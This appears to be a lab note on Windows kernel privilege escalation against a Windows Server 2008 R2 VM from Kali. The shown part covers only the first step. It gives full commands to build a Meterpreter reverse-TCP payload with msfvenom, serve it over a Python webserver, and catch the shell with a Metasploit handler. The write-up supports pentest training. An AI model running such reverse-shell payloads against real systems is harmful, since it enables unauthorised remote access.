# 🔬Windows Kernel Privileges

## Lab

> 🔬 **Extra Lab**
>
> Setup a vulnerable _Windows 2008 R2 Virtual Machine_ and connected it to the same network of the Kali virtual machine.
>
> * Host system: `Kali Linux`
> * Target system: `Windows Server 2008 R2`&#x20;
> * Target IP: `192.168.42.139`&#x20;
> * Local IP: `192.168.42.132`
> * Exploitation tool:
>   * [**Windows-Exploit-Suggester**](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)&#x20;
>   * [**windows-kernel-exploits**](https://github.com/SecWiki/windows-kernel-exploits)

### Exploitation

* Get a `Meterpreter` session on the target with a manual payload
* Create the payload on the Kali VM

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=4444 .f exe > payload.exe
```

* Start a webserver on Kali VM

```bash
python3 -m http.server 
```

* On the Win2008 VM
  * Open the link `http://192.168.42.132:8000/` and download `payload.exe`
  * Stop the webserver on Kali VM
* Set up a payload handler on Kali VM

```bash
┌──(k3shi㉿kali)-[~]
└─$ msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.42.132
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

* On the Win2008 VM, run the payload







